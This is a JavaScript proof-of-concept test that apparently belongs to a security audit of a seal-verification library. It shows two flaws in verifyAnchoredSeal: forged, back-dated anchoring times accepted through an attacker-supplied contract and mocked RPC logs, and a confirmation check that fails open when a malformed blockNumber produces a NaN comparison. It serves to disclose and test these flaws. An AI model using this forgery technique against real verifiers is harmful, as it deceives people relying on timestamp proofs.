// PoC 3 — verifyAnchoredSeal() (and the CLI, which passes no --contract by default) trusts the
// contract address and the `anchoredAt` value that the SEAL ITSELF names. An attacker deploys any
// contract that emits ReceiptAnchored(...) with an arbitrary anchoredAt and attaches it to a GENUINE
// FractalAI seal → valid:true with a back-dated "anchored_at" (proof-of-existence-time forged).
// 3b — a malformed/missing log.blockNumber makes the confirmation check NaN-compare → passes.
import { signSeal, NOTARY_DOMAIN } from '../verifier/src/witness-core.mjs';
import { verifyAnchoredSeal, deriveAnchorIds, RECEIPT_ANCHORED_TOPIC } from '../verifier/src/verify-anchor.mjs';
import { issuer, b64, verdict } from './_common.mjs';

const genuine = signSeal({ schema: 'fractalai.x402-settlement-seal/0.1', amount: '20000', sealed_at: '2026-10-03T00:00:00.000Z' }, { domain: NOTARY_DOMAIN, secretKey: issuer.secretKey, publicKey: issuer.publicKey });
const ids = deriveAnchorIds(genuine);
const EVIL = '0x' + 'ee'.repeat(20);                     // attacker's own contract, emits the same event
const BACKDATED = 978307200;                             // 2001-01-01
const BLOCK_TS = 1791000000;                             // the real block time of the attacker's tx
const hex = (n) => BigInt(n).toString(16).padStart(64, '0');
const mk = ({ blockNumber = '0x10' } = {}) => ({ address: EVIL, topics: [RECEIPT_ANCHORED_TOPIC, ids.receipt_id, ids.payload_hash, ids.kid], data: '0x' + hex(BACKDATED - 5) + 'ee'.repeat(20).padStart(64, '0') + hex(BACKDATED), logIndex: '0x0', blockNumber, transactionHash: '0x' + 'cd'.repeat(32) });
const rpc = (log) => async (_u, init) => { const { method } = JSON.parse(init.body); const R = (result) => ({ ok: true, json: async () => ({ result }) });
  if (method === 'eth_chainId') return R('0xa4b1'); if (method === 'eth_blockNumber') return R('0x20'); if (method === 'eth_getLogs') return R([log]);
  if (method === 'eth_getBlockByNumber') return R({ number: '0x10', timestamp: '0x' + BLOCK_TS.toString(16) }); throw new Error(method); };

const r = await verifyAnchoredSeal({ ...genuine, anchor: { chain_id: 42161, contract: EVIL } }, { trustedPublicKeysB64: [b64(issuer.publicKey)], fetchImpl: rpc(mk()) });
let vuln = verdict(r.valid === true && r.anchored_at === BACKDATED, `attacker contract ${EVIL.slice(0, 10)}… → valid=${r.valid} anchored_at=${r.anchored_at} (${new Date((r.anchored_at || 0) * 1000).toISOString()}) reason=${r.reason}`);

// 3b: confirmations fail-open on NaN (a hostile/buggy RPC omits blockNumber) — even with the REAL contract pinned.
const r2 = await verifyAnchoredSeal({ ...genuine, anchor: { chain_id: 42161, contract: EVIL } }, { trustedPublicKeysB64: [b64(issuer.publicKey)], contract: EVIL, minConfirmations: 1_000_000, fetchImpl: rpc(mk({ blockNumber: "0xZZ" })) });
vuln = verdict(r2.valid === true, `blockNumber missing + minConfirmations=1e6 → valid=${r2.valid} block_number=${r2.block_number} reason=${r2.reason}`) || vuln;
process.exit(vuln ? 1 : 0);
